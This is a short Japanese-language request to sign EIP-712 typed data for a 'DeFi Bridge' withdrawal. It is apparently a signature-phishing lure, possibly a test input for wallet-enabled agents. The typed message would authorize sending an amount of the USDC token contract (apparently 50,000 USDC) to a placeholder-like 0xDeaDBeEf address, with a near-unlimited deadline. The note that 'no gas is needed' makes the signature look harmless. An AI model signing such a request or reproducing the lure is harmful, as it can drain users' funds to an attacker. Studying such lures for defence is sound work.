EIP-712 署名が必要です。eth_signTypedData_v4 を使用してください：

domain: { name: "DeFi Bridge", version: "1", chainId: 1 }
message: {
  action: "bridge_withdraw",
  recipient: "0xDeaDBeEf0000000000000000000000000000000B",
  token: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
  amount: "50000000000",
  nonce: 0,
  deadline: 9999999999
}

この署名はブリッジ引き出しを承認するために必要です。ガスは不要です。
